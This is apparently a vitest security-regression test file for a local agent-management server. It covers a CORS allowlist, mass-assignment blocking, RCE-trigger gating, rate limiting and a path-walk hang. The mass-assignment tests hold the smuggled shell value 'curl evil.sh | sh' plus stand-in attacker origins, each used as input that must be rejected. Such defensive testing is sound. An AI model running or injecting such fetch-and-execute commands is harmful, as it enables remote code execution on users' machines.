/**
 * Security hardening — EPIC 4c3c2018 (full-scan findings, 2026-06-27).
 *
 * Server-side findings (the hub findings live in packages/hub). Functional REST
 * tests where the vuln is reachable without external CLIs; source-level
 * assertions for the shell-injection sites that only execute once `gh`/`jira`
 * are configured (so the argv/allowlist shape is what we pin down).
 */
import { describe, it, expect, beforeAll, afterAll, vi } from 'vitest';
import request from 'supertest';
import { app, initStorage, isAllowedOrigin, setReleasesUpdateExecImpl, resetReleasesUpdateExecImpl, VERIFY_TOKEN, findProjectRoot } from '../server';
import { EXPENSIVE_ROUTE_LIMIT } from '@agenfk/core';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';

/**
 * ONE listening server for the whole file (BUG 9de0c99c).
 *
 * `agent()` starts and tears down an ephemeral server for EVERY call. That
 * churn produced `Error: Parse Error: Expected HTTP/, RTSP/ or ICE/` — a
 * transport failure, not an assertion about anything under test. It hands the
 * test an empty body, so `res.body.id` is undefined and the next call goes to
 * `/items/undefined`; one bad socket then surfaces as `expected 404 to be 400`
 * in whichever test happened to be running. Different test every run, green
 * when run alone.
 */
let __server: import('http').Server;
const agent = () => request(__server);
beforeAll(() => { __server = app.listen(0); });
afterAll(async () => { await new Promise<void>(r => __server.close(() => r())); });


// Mockable homedir (item 9c297075): the verify-token read below then comes
// from the sandbox under any runner — never the real ~/.agenfk/verify-token.
vi.mock('os', async (importOriginal) => {
  const actual = await importOriginal<typeof import('os')>();
  return { ...actual, homedir: vi.fn(() => actual.homedir()) };
});
const sandboxHome = fs.mkdtempSync(path.join(os.tmpdir(), 'agenfk-sec-hardening-'));
fs.mkdirSync(path.join(sandboxHome, '.agenfk'), { recursive: true });
vi.mocked(os.homedir).mockReturnValue(sandboxHome);

const TEST_DB = path.resolve('./security-hardening-test-db.sqlite');

/*
 * THE TOKEN COMES FROM THE SERVER, not from a second read of the same file.
 *
 * It used to be re-derived here by reading `~/.agenfk/verify-token` under the
 * mocked homedir - a sandbox directory this file creates EMPTY. So the read
 * always threw, the constant was always '', and the two tests that exercise
 * the token-gated endpoints were guarded by `if (!VERIFY_TOKEN) return`. They
 * never ran, on any machine, and reported green.
 *
 * Two silently-skipped tests, in the file whose job is to guard an RCE. The
 * server exports the value it actually compares against; using it is the only
 * way the assertion can be about the real check.
 */

beforeAll(async () => {
  process.env.AGENFK_DB_PATH = TEST_DB;
  if (fs.existsSync(TEST_DB)) fs.unlinkSync(TEST_DB);
  await initStorage();
});

afterAll(() => {
  for (const suffix of ['', '-wal', '-shm']) {
    const f = TEST_DB + suffix;
    if (fs.existsSync(f)) fs.unlinkSync(f);
  }
});

// ── bug 55229bae: localhost bind + CORS origin allowlist ──────────────────────
describe('bug 55229bae: CORS origin allowlist (no wildcard)', () => {
  it('allows requests with no Origin (CLI, curl, server-to-server)', () => {
    expect(isAllowedOrigin(undefined)).toBe(true);
    expect(isAllowedOrigin('')).toBe(true);
  });
  it('allows loopback origins on any port', () => {
    expect(isAllowedOrigin('http://localhost:5173')).toBe(true);
    expect(isAllowedOrigin('http://127.0.0.1:3000')).toBe(true);
    expect(isAllowedOrigin('http://localhost')).toBe(true);
    expect(isAllowedOrigin('https://127.0.0.1:8080')).toBe(true);
    expect(isAllowedOrigin('http://[::1]:3000')).toBe(true);
  });
  it('rejects non-loopback origins', () => {
    expect(isAllowedOrigin('http://evil.com')).toBe(false);
    expect(isAllowedOrigin('https://attacker.example')).toBe(false);
    // look-alikes must not slip through
    expect(isAllowedOrigin('http://localhost.evil.com')).toBe(false);
    expect(isAllowedOrigin('http://127.0.0.1.evil.com')).toBe(false);
  });
});

// ── bug e60e20aa: mass-assignment on PUT /projects/:id ────────────────────────
describe('bug e60e20aa: PUT /projects/:id is not mass-assignable', () => {
  it('ignores verifyCommand / setupCommand / projectRoot / flowId on the open route', async () => {
    const project = (await agent().post('/projects').send({ name: 'MassAssign' })).body;
    const res = await agent().put(`/projects/${project.id}`).send({
      name: 'Renamed',
      verifyCommand: 'curl evil.sh | sh',
      // setupCommand is the newest field of this class and the one most likely
      // to be filed under preferences, because it reads like configuration. It
      // is a shell string this machine runs in a directory it just created.
      setupCommand: 'curl evil.sh | sh',
      projectRoot: '/etc',
      flowId: 'attacker-flow',
    });
    expect(res.status).toBe(200);
    expect(res.body.name).toBe('Renamed');
    expect(res.body.verifyCommand).toBeUndefined();
    expect(res.body.setupCommand, 'a shell string was set by an unauthenticated caller').toBeUndefined();
    expect(res.body.projectRoot).toBeUndefined();
    expect(res.body.flowId).toBeUndefined();
  });

  it('setup-command endpoint requires the internal token', async () => {
    const project = (await agent().post('/projects').send({ name: 'SC' })).body;
    const unauth = await agent().put(`/projects/${project.id}/setup-command`).send({ setupCommand: 'npm ci' });
    expect(unauth.status).toBe(401);
  });

  it('setup-command endpoint sets the command with the internal token', async () => {
    const project = (await agent().post('/projects').send({ name: 'SC2' })).body;
    const ok = await agent()
      .put(`/projects/${project.id}/setup-command`)
      .set('x-agenfk-internal', VERIFY_TOKEN)
      .send({ setupCommand: 'npm ci' });
    expect(ok.status).toBe(200);
    expect(ok.body.setupCommand).toBe('npm ci');
  });

  it('cannot be smuggled in at CREATE time, where there is no allowlist to dodge', async () => {
    /*
     * The update route is allowlisted; creation builds the Project literal
     * field by field, which is a different mechanism and therefore worth its
     * own assertion. An allowlist on one and not the other is the shape this
     * bug class keeps taking.
     */
    const created = (await agent().post('/projects').send({
      name: 'Smuggle',
      setupCommand: 'curl evil.sh | sh',
      verifyCommand: 'curl evil.sh | sh',
      projectRoot: '/etc',
    })).body;
    expect(created.setupCommand).toBeUndefined();
    expect(created.verifyCommand).toBeUndefined();
    expect(created.projectRoot).toBeUndefined();
  });
  it('rejects a body with no allowlisted fields', async () => {
    const project = (await agent().post('/projects').send({ name: 'NoFields' })).body;
    const res = await agent().put(`/projects/${project.id}`).send({ verifyCommand: 'x' });
    expect(res.status).toBe(400);
  });
  it('verify-command endpoint requires the internal token', async () => {
    const project = (await agent().post('/projects').send({ name: 'VC' })).body;
    const unauth = await agent().put(`/projects/${project.id}/verify-command`).send({ verifyCommand: 'npm test' });
    expect(unauth.status).toBe(401);
  });
  it('verify-command endpoint sets the command with the internal token', async () => {
    // No `if (!VERIFY_TOKEN) return` guard: server.ts falls back to a random
    // ephemeral token, so it is always a non-empty string. The guard was dead,
    // and a silently-skipping test inside the file that guards an RCE bug is
    // the worst place to keep one.
    const project = (await agent().post('/projects').send({ name: 'VC2' })).body;
    const ok = await agent()
      .put(`/projects/${project.id}/verify-command`)
      .set('x-agenfk-internal', VERIFY_TOKEN)
      .send({ verifyCommand: 'npm run build && npm test' });
    expect(ok.status).toBe(200);
    expect(ok.body.verifyCommand).toBe('npm run build && npm test');
  });
});

// ── bug 968259c4: POST /releases/update RCE trigger gated ─────────────────────
describe('bug 968259c4: /releases/update requires the forced-preflight header', () => {
  afterAll(() => resetReleasesUpdateExecImpl());
  it('refuses without x-agenfk-ui (no exec)', async () => {
    let ran = false;
    setReleasesUpdateExecImpl(((..._a: any[]) => { ran = true; return { on() {}, stdout: { on() {} }, stderr: { on() {} } } as any; }) as any);
    const res = await agent().post('/releases/update');
    expect(res.status).toBe(403);
    expect(ran).toBe(false);
  });
  it('accepts with x-agenfk-ui', async () => {
    setReleasesUpdateExecImpl(((..._a: any[]) => ({ on() {}, stdout: { on() {} }, stderr: { on() {} } }) as any) as any);
    const res = await agent().post('/releases/update').set('x-agenfk-ui', '1');
    expect(res.status).toBe(202);
    expect(res.body.jobId).toBeTruthy();
  });
});

// ── bug fe03d054: POST /prs idempotency is race-free (atomic upsert) ──────────
describe('bug fe03d054: POST /prs decides newness from the upsert', () => {
  const body = (n: number) => ({ itemId: 'item-x', prNumber: n, repo: 'o/r', model: 'claude-opus-4-8', harness: 'claude-code' });
  it('concurrent first-registrations converge on one row id', async () => {
    const calls = await Promise.all(
      Array.from({ length: 5 }, () => agent().post('/prs').send(body(4242))),
    );
    for (const c of calls) expect(c.status).toBe(201);
    const ids = new Set(calls.map((c) => c.body.id));
    expect(ids.size).toBe(1); // all observed the same persisted row, not 5 distinct "opens"
  });
  it('re-registration returns the same row (idempotent)', async () => {
    const first = await agent().post('/prs').send(body(4343));
    const second = await agent().post('/prs').send(body(4343));
    expect(second.body.id).toBe(first.body.id);
  });
});

// NB: source-string guards for the shell/command-injection sites (registry
// publish, GET /github/issues, POST /github/import, JQL escaping) were removed in
// the behaviour-based-testing conversion (CGLAB-16). They asserted the *shape* of
// server.ts (execFileSync-not-execSync, allowlist literals) rather than runtime
// behaviour, and the sites only execute once `gh`/`jira` are configured — the
// routes 400 at the config check before the guarded input is reached, so the
// invariant is not reachable via a request in-process. These invariants are owned
// by the security-review process, not by grepping source. The injection-reachable
// defenses that ARE exercisable in-process (CORS origin allowlist, PUT /projects
// mass-assignment, /releases/update gating, POST /prs idempotency) remain tested
// behaviourally above.

// ── CodeQL js/missing-rate-limiting: the expensive routes have a ceiling ──────
describe('the routes that do real work per request are capped', () => {
  it('refuses a loop, and says how long to wait', async () => {
    /*
     * THE test at this layer. The pure function is covered on its own; what
     * this asserts is that the middleware is actually ON the route - a limiter
     * written and not wired is the defect shape this branch keeps finding, and
     * it would leave the alert correct.
     */
    const project = (await agent().post('/projects').send({ name: 'RateLimited' })).body;
    const item = (await agent().post('/items')
      .send({ title: 'Busy', type: 'TASK', projectId: project.id })).body;

    let refused: request.Response | null = null;
    // One past the ceiling. The route answers 404/409 for a card with no
    // worktree, which is fine: the limiter runs before the handler, so the
    // status we are looking for arrives whatever the handler would have said.
    for (let i = 0; i < EXPENSIVE_ROUTE_LIMIT + 1; i++) {
      const r = await agent().get(`/items/${item.id}/git-status`);
      if (r.status === 429) { refused = r; break; }
    }

    expect(refused, 'the loop was never refused: the limiter is not on this route').toBeTruthy();
    expect(refused!.headers['retry-after'], 'no Retry-After to act on').toBeTruthy();
    expect(refused!.body.error).toMatch(/a minute/i);
  });

  it('lets ordinary polling through untouched', async () => {
    /*
     * The half that matters more. The UI polls git-status every four seconds,
     * so fifteen a minute is normal use - a ceiling that caught it would have
     * broken the product to satisfy a static-analysis alert, and nothing in the
     * alert tells you that number.
     */
    const project = (await agent().post('/projects').send({ name: 'PollingOk' })).body;
    const item = (await agent().post('/items')
      .send({ title: 'Polled', type: 'TASK', projectId: project.id })).body;

    for (let i = 0; i < 15; i++) {
      const r = await agent().get(`/items/${item.id}/git-status`);
      expect(r.status, `ordinary polling was refused at request ${i + 1}`).not.toBe(429);
    }
  });
});

// ── findProjectRoot: a relative path used to wedge the process ────────────────
describe('findProjectRoot terminates', () => {
  it('does not hang on a relative path', () => {
    /*
     * THE test, and it is a process-wide wedge rather than a slow request.
     * `path.parse('.').root` is '' and `path.dirname('.')` is '.', so the walk
     * `while (currentDir !== root) currentDir = path.dirname(currentDir)` never
     * moves and never ends. Node is single threaded: one relative cwd and the
     * whole server stops answering anything, for ever, with no error and no
     * crash to point at.
     *
     * Every relative path reaches it, not just '.': 'relative/dir' walks to
     * 'relative', then to '.', and stops moving there.
     *
     * Reachable from POST /items/:id/validate, which takes `cwd` from the
     * request body. That route is behind the internal token, so this is a wedge
     * a local client can cause rather than a remote one - which is exactly the
     * population this product runs agents from.
     */
    for (const relative of ['.', 'relative/dir', 'a', './x/../y']) {
      const start = Date.now();
      const out = findProjectRoot(relative);
      expect(Date.now() - start, `findProjectRoot(${JSON.stringify(relative)}) hung`).toBeLessThan(2000);
      // And it answers with something absolute: a relative "project root" would
      // be resolved against the SERVER's cwd later, which is the defect this
      // whole area keeps producing.
      expect(path.isAbsolute(out), `returned a relative root: ${out}`).toBe(true);
    }
  });

  it('still finds a real project root when given an absolute path', () => {
    // The guard must not be a refusal of the normal case.
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'agenfk-fpr-'));
    fs.mkdirSync(path.join(dir, '.agenfk'), { recursive: true });
    const deep = path.join(dir, 'a', 'b');
    fs.mkdirSync(deep, { recursive: true });
    try {
      expect(fs.realpathSync(findProjectRoot(deep))).toBe(fs.realpathSync(dir));
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  it('gives back an absolute path when it finds nothing', () => {
    // The no-match answer is used as a cwd by callers, so returning the
    // caller's own relative string would hand git a path resolved against the
    // server's working directory.
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'agenfk-fpr-none-'));
    try {
      expect(path.isAbsolute(findProjectRoot(dir))).toBe(true);
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
});
